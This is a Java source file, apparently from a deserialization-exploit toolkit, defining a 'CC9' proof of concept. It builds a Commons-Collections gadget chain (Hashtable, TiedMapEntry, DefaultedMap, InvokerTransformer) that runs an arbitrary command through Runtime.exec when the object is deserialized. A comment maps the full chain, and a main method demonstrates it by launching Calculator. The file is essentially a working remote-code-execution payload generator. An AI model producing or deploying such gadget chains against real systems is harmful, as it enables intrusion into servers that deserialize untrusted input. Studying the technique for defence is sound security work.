package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;

import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						DefaultedMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
	Requires:
		commons-collections
 */
public class CC9 implements POC{
    @Override
    public Object getPocObject(String cmd) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Map innerMap = new HashMap();

        final Map defMap = DefaultedMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(defMap, "foo");
        Hashtable hashtable = new Hashtable();
        hashtable.put("foo",1);

        // 获取hashtable的table类属性
        Object[] table = (Object[]) ReflectUtils.getFieldValue(hashtable,"table");
        Object entry1 = table[0];

        if(entry1==null)
            entry1 = table[1];
        // 获取Hashtable.Entry的key属性
        // 将key属性给替换成构造好的TiedMapEntry实例

        ReflectUtils.setFieldValue(entry1,"key",entry);

        // 填充真正的命令执行代码
        ReflectUtils.setFieldValue(defMap, "value", GCC.invokerTransformer2RCE(cmd));

        return hashtable;
    }

    public static void main(String[] args) throws Exception {
        CC9 gen = new CC9();
        String cmd = "open -a Calculator.app";
        Object poc1 = gen.getPocObject(cmd);
        byte[] test = SerializeUtils.serialize(poc1);
        System.out.println("---------");
        SerializeUtils.deserialize(test);
    }
}
